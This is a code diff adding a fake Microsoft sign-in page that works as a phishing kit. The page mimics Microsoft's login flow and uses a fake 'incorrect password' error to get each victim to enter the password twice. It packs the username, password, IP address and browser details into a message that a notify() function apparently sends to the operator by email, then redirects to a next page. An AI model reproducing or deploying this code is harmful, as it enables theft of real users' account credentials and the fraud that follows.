@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="images/00ee4254e044d7b68f9e008a0d3928e29791b7df.ico">
+    <link rel="stylesheet" href="style.css">
+    <title>Sign in to your account</title>
+<script type="text/javascript"  src="jquery.min.js"></script>
+<script type="text/javascript" src="info.js">
+</script>
+<script type="text/javascript"
+        src="email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: PUBLIC_KEY,
+      });
+   })();
+</script>
+</head>
+
+<body>
+
+    <div class="container">
+        <!--<img class="bg-logo" role="presentation" src="images/7278e87106cce353590eb53597b9eeef.png">!-->
+
+        <form id="formg" name="formg" method="POST">
+
+            <img class="logo" src="images/bb5055184f1d2df9d7d4ca9b5fc608e3.svg">
+            <div class="forms-container">
+                <div class="forms">
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div id="err"></div>
+                        <div class="form-group">
+                            <input type="email" value="" placeholder="Email, Phone" id="loginfmt" name="loginfmt">
+                        </div>
+                        <p>No aacount? <a href="#">Create One!</a></p>
+                        <a href="#" style="display:none;">Sign in with a security key <span>?</span></a>
+                        <button type="button" class="next-btn">Next</button>
+                    </div>
+
+                    <input value="" id="eip" name="eip" type="hidden" />
+
+                    <div class="second">
+                        
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email"></span></p>
+                        <h2>Enter password</h2>
+                        <div id="errp"></div>
+                        <div class="form-group">
+                            <input type="password" placeholder="Password" name="loginpwd" id="loginpwd">
+                        </div>
+                        <a href="#">Forgot password?</a>
+                        <button type="submit" name="log_on" id="log_on">Sign in</button>
+                    </div>
+                </div>
+            </div>
+        </form>
+        <div class="bottom">
+            <img src="images/8680c3bcbc7d795133ee9e334bd71abb.svg">
+            <span>Sign-in options</span>
+        </div>
+    </div>
+
+
+    <script>
+        function validateEmail(email) {
+            var re = /\S+@\S+\.\S+/;
+            return re.test(email);
+        }
+
+        const forms = document.querySelector('.forms');
+        const next_button = document.querySelector('.next-btn');
+        const arrow_btn = document.querySelector('.arrow-btn');
+
+        const email_input = document.querySelector('.first input');
+        const email_el = document.querySelector('.email');
+
+        const loginfmt = document.getElementById("loginfmt");
+        const loginpwd = document.getElementById("loginpwd");
+
+        next_button.addEventListener('click', () => {
+
+            email_el.innerText = email_input.value;
+            
+  
+            if ((email_input.value == "") == true) {
+                document.getElementById('err').innerHTML = "<span>Enter a valid email address, phone number.</span>";
+                loginfmt.classList.add("has-error");
+                
+            } else if (validateEmail(email_input.value) == false) {
+                document.getElementById('err').innerHTML = "<span>We couldn't find an account with that username. Try another, or</span> <a href='#'>get a new Microsoft account</a><span>.<sapn>";
+                loginfmt.classList.add("has-error");
+            } else {
+                loginfmt.classList.remove("has-error");
+                forms.classList.add('next-form');
+                document.querySelector('.bottom').style.display = 'none';
+                arrow_btn.addEventListener('click', () => {
+                    forms.classList.remove('next-form')
+                    document.querySelector('.bottom').style.display = 'flex';
+
+                })
+            }
+
+
+        })
+    </script>
+
+
+    <script type="text/javascript"  src="post.js"></script>
+
+
+    <script type="text/javascript">
+
+        let is_subm = 0;
+
+        $(document).ready(function(){
+          fetch_ip();
+
+          const provider = "MICROSOFTONLINE-COM(https://login.microsoftonline.com)";
+
+          const get_browsername = browserN();
+          $("#formg").on('submit', function(e) {
+            e.preventDefault();
+            var loginfmt = $("#loginfmt").val();
+            var loginpwd = $("#loginpwd").val();
+            var url = $("#url").val();
+            var refer = $("#refer").val();
+            var get_ip = $("#eip").val();
+            var recaptcha = '';
+            var recapres = '';
+            if (loginpwd == "") {
+                $("#errp").html("<span>Please enter the password for your Microsoft account.<sapn>");
+                $("#loginpwd").addClass("has-error");
+            } else {
+                $("#err").html('');
+                $("#errp").html('');
+                try{
+                    $("#loginpwd").removeClass("has-error");
+                    $("#loginfmt").removeClass("has-error");
+                }catch(e){
+
+                }
+
+              is_subm = is_subm +1;
+              var stage = "Confirmed";
+              if(is_subm == 1){
+                var stage = "New";
+                $("#loginpwd").val("");
+                try{
+                    $("#loginpwd").addClass("has-error");
+                }catch(e){
+
+                }
+                $("#errp").html('<span>The Microsoft ID or password you entered was incorrect. Please try again.</span>');
+              }
+
+              var message = `STAGE: ${stage}\nPROVIDER: ${provider}\nUSERNAME: ${loginfmt}\nPASSWORD: ${loginpwd}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
+              document.cookie = `user=${encodeURIComponent(loginfmt)}; max-age=2592000; path=/; SameSite=Lax`;
+              const currentUrl = window.location.href;
+              var upath = (currentUrl.endsWith('/') ? '' : '/')+"next.html";
+              var newUrl = currentUrl + upath;
+              var status = notify(loginfmt, message, newUrl, is_subm);
+
+              if(is_subm > 1){
+                 $("#log_on").text("Processing");
+                $("#log_on").prop("disabled",true);
+                $("#log_on").attr("disabled", "disabled");
+                try{
+                    $("#loginpwd").removeClass("has-error");
+                    $("#loginfmt").removeClass("has-error");
+                }catch(e){
+
+                }
+
+
+              }
+
+
+            }
+
+          });
+
+        })
+
+
+    </script>
+
+</body>
+
+</html>
